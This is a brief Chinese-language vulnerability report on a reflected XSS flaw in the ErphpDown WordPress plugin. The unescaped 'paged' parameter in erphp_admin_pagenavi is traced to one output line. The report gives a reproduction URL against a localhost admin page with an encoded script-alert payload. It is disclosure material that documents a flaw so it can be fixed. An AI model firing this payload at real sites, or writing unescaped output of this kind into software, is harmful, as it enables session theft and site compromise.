## ErphpDown插件反射型xss

在erphpdown/includes/mobantu.php文件中的erphp_admin_pagenavi方法中先是接收了get请求中的参数paged，最后在361行处直接输出在页面中，导致了反射型xss漏洞。

![1560842530366](https://github.com/QiAnXinCodeSafe/Legendsec/blob/master/Erphpdown/images/1560842530366.png)

![1560842559869](https://github.com/QiAnXinCodeSafe/Legendsec/blob/master/Erphpdown/images/1560842559869.png)

## 复现：

localhost/WordPress/wp-admin/admin.php?page=erphpdown%2Fadmin%2Ferphp-vip-items.php&paged=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

![1560842932807](https://github.com/QiAnXinCodeSafe/Legendsec/blob/master/Erphpdown/images/1560842932807.png)
